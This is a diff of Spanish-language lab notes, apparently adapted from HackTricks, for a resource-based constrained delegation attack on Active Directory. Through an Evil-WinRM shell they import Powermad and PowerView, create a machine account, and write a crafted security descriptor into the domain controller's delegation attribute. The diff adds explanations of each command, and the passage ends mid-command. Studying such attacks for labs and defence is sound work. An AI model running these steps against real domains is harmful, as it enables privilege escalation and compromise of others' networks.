@@ -12,11 +12,15 @@ Extraído de de [Hacktricks](https://book.hacktricks.xyz/windows-hardening/activ
 
 Primero lo que tenemos que hacer es subirnos el [Powermad.ps1](https://github.com/Kevin-Robertson/Powermad) en la máquina víctima y luego el [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1). Eso si, hay que importar ambos, una vez los hayamos subido en la máquina víctima, de la siguiente manera
 
+`Powermad`: Con esto puedes crear un "object computer" dentro del dominio
+
+`PowerView`: Es una herramienta escrita en PowerShell diseñada para obtener información en redes de Windows Active Directory.
+
 ```
 *Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\Powermad.ps1
 ```
 
-Luego ejecutamos el siguiente comando (Lo que dice "SERVICEA" lo puedes cambiar por lo que quieras y la parte de los números, que es una constraseña, también, pero simplemente recuerda esto para luego) 
+Luego ejecutamos el siguiente comando (Lo que dice "SERVICEA" lo puedes cambiar por lo que quieras y la parte de los números, que es una constraseña, también, pero simplemente recuerda esto para luego). Esto es para crear una cuenta de máquina ó "MachineAccount" proporcionandole una contraseña y un nombre en específico
 
 ```
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -27,7 +31,7 @@ Luego puedes verificar que lo anterior se ejecutó correctamente de la siguiente
 Get-DomainComputer SERVICEA
 ```
 
-Una vez hecho esto, hacemos el siguiente comando para almacenar en una variable el Domain-Sid
+Una vez hecho esto, hacemos el siguiente comando para almacenar en una variable el ObjectSid
 
 ```
 $ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid
@@ -39,25 +43,27 @@ Y lo comprobamos haciendo
 echo $ComputerSid
 ```
 
-Luego ejecutamos esto 
+Luego ejecutamos esto que lo que hace es crear un nuevo objeto "RawSecurityDescriptor" que contiene la información de seguridad especificada en la cadena de caracteres y lo asigna a la variable $SD. Y también asigna los permisos ó el control total al propietario del objeto, que en este caso es con el usuario al cual tienes acceso en la máquina víctima
 
 ```
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
 ```
 
-Luego el siguiente:
+Luego el siguiente que lo que hace es crear un nuevo array de bytes con un tamaño igual al tamaño de la información de seguridad contenida en el objeto $SD y lo asigna a la variable $SDBytes
 
 ```
 $SDBytes = New-Object byte[] ($SD.BinaryLength)
 ```
 
-Luego esta
+Luego esta que lo que hace es  obtener la representación binaria de la información de seguridad contenida en el objeto $SD y la escribe en el array de bytes $SDBytes
 
 ```
 $SD.GetBinaryForm($SDBytes, 0)
 ```
 
-Luego (en este aso se pone "dc" porque así se llama la máquina. En hacktricks trae una variable, pero esa variable nunca la hemos definido, por ende ponemos "dc")
+Luego (en este caso se pone "dc" porque así se llama la máquina. En hacktricks trae una variable, pero esa variable nunca la hemos definido, por ende ponemos "dc"). 
+
+Esto lo que hace es obtener información sobre un equipo de dominio específico, establece el valor del atributo "msds-allowedtoactonbehalfofotheridentity" del equipo de dominio al valor del array de bytes $SDBytes y actualiza el equipo de dominio con los cambios
 
 ```
 Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDByte
